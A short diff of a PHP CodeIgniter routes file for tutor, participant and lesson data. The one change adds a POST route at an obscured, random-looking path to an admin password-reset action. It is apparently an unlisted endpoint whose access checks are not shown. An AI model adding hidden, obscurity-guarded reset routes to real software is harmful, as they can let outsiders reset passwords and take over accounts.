@@ -59,6 +59,7 @@ $routes->delete('/data/tentor/(.*)', 'Admin::delete/tentor/$1');
 $routes->get('/data/peserta', 'Admin::index/peserta');
 $routes->put('/data/peserta/(.*)', 'Admin::update/peserta/$1');
 $routes->delete('/data/peserta/(.*)', 'Admin::delete/peserta/$1');
+$routes->post('/1bc851671nc289n', 'Admin::reset_pass');
 
 // list, tambah, update, delete data les
 $routes->get('/data/les', 'Les::index');
